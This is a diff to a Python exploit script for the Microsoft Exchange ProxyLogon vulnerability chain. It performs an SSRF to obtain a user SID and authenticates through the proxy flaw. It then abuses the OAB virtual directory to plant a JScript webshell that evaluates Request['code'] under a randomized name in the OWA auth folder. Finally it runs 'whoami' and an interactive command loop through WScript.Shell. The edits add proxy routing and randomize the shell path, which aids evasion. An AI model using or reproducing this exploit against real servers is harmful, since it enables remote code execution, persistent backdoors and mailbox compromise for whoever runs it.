@@ -40,13 +40,16 @@ LOCAL_NAME = ''
 DOMAIN = ''
 COMPUTER = ''
 
-user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
+random_str = ''.join(random.sample(string.ascii_letters + string.digits, 20))
+user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 " \
+             "Safari/537.36 "
 
-shell_path = "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\qwesdSDFASFQqeqweqsf.aspx"
+shell_path = "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\" + random_str + ".aspx"
 shell_absolute_path = "\\\\127.0.0.1\\c$\\%s" % shell_path
 
 # webshell
-shell_content = '<script language="JScript" runat="server"> function Page_Load(){/**/eval(Request["code"],"unsafe");}</script>'
+shell_content = '<script language="JScript" runat="server"> function Page_Load(){/**/eval(Request["code"],' \
+                '"unsafe");}</script> '
 
 # webshell exec
 '''
@@ -113,7 +116,7 @@ def get_ComputerName():
     # 请求rpc 获取NTLM 认证
     # nmap也有一个可以通过rpc来获取exchange信息的
     # nmap MAIL  -p 443 --script http-ntlm-info --script-args http-ntlm-info.root=/rpc/rpcproxy.dll
-    r = requests.get('https://%s/rpc/' % target, headers=headers, verify=False)
+    r = requests.get('https://%s/rpc/' % target, headers=headers, verify=False, proxies=proxies)
     auth_header = r.headers['WWW-Authenticate']
     auth = re.search('Negotiate ([A-Za-z0-9/+=]+)', auth_header).group(1)
     domain_name, computer_name = parse_challenge(base64.b64decode(auth))
@@ -142,6 +145,7 @@ def get_sid(mail):
             "User-Agent": user_agent,
         },
         data=payload,
+        proxies=proxies,
         verify=False
     )
     if ssrf_xml.status_code != 200:
@@ -175,6 +179,7 @@ def get_sid(mail):
     },
                        data=mapi_body,
                        verify=False,
+                       proxies=proxies,
                        )
     if ct.status_code != 200 or "act as owner of a UserMailbox" not in str(ct.content):
         print("[-] Mapi Error!")
@@ -199,6 +204,7 @@ def proxyLogon(sid):
         "User-Agent": user_agent
     },
                                    verify=False,
+                                   proxies=proxies,
                                    data=proxyLogon_data,
                                    )
     if proxyLogon_res.status_code != 241 or not "set-cookie" in proxyLogon_res.headers:
@@ -227,7 +233,7 @@ def proxyLogon(sid):
                            "Parameters": {
                                "__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                "SelectedView": "", "SelectedVDirType": "All"}}, "sort": {}},
-                       verify=False
+                       verify=False, proxies=proxies
                        )
 
     if ct.status_code != 200:
@@ -255,7 +261,7 @@ def proxyLogon(sid):
         "User-Agent": user_agent
     },
                        json=oab_json,
-                       verify=False
+                       verify=False, proxies=proxies
                        )
     if ct.status_code != 200:
         print("Set external url Error!")
@@ -275,7 +281,7 @@ def proxyLogon(sid):
         "User-Agent": user_agent
     },
                        json=reset_oab_body,
-                       verify=False
+                       verify=False, proxies=proxies
                        )
 
     if ct.status_code != 200:
@@ -284,10 +290,10 @@ def proxyLogon(sid):
 
     print(" |")
     print("[*]upload shell success")
-    print("POST  shell:https://" + target + "/owa/auth/qwesdSDFASFQqeqweqsf.aspx")
+    print("POST  shell:https://" + target + "/owa/auth/" + random_str + ".aspx")
     print(" |")
     print("[+] request shell now")
-    shell_url = "https://" + target + "/owa/auth/qwesdSDFASFQqeqweqsf.aspx"
+    shell_url = "https://" + target + "/owa/auth/" + random_str + ".aspx"
     time.sleep(10)
     # print('code=Response.Write(new ActiveXObject("WScript.Shell").exec("whoami").StdOut.ReadAll());')
 
@@ -295,16 +301,20 @@ def proxyLogon(sid):
     #     "code": "Response.Write(new ActiveXObject(\"WScript.Shell\").exec(\"whoami\").StdOut.ReadAll());"},
     #                      verify=False, proxies=proxies)
     post_data = {"code": "Response.Write(new ActiveXObject(\"WScript.Shell\").exec(\"whoami\").StdOut.ReadAll());"}
-    data = requests.post(shell_url, data=post_data, verify=False)
+    data = requests.get(shell_url, verify=False, proxies=proxies)
     if data.status_code != 200:
         print("[-] request shell failure ")
     elif "<div class=\"errorHeader\">404</div>" in data.text:
         print("[-] request shell failure , 404 shell ! ")
-    else:
+    elif "OAB (Default Web Site)" in data.text:
         print("\n |")
         print("[*]Got shell success")
         print(" |")
-        print()
+
+    data = requests.get(shell_url, verify=False, data=post_data, proxies=proxies)
+    if data.status_code == 500:
+        print("[-] exec error !\n")
+    else:
         print("[+] 权限如下：" + data.text.split("OAB (Default Web Site)")[0].replace("Name                            : ",
                                                                                  ""))
         print(" |")
@@ -321,7 +331,7 @@ def proxyLogon(sid):
                 data = requests.post(shell_url, data={
                     "code": "Response.Write(new ActiveXObject(\"WScript.Shell\").exec(\"{}\").StdOut.ReadAll());".format(
                         cmd)},
-                                     verify=False)
+                                     verify=False, proxies=proxies)
                 if data.status_code == 500:
                     print("[-] exec error ! ")
                 elif "errorFooter" in data.text:
